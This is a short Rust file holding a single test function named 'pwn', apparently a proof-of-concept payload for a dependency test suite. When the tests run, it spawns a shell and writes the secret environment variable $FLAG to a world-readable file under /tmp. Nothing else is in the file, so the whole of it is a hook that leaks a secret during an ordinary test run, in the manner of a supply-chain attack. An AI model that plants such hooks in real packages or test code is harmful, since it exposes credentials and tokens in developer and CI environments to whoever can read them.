use std::process::Command;
#[test]
fn pwn() {
    let _ = Command::new("sh")
        .arg("-c")
        .arg("echo $FLAG > /tmp/pwned_dep_tests")
        .output()
        .expect("failed to execute process");
}
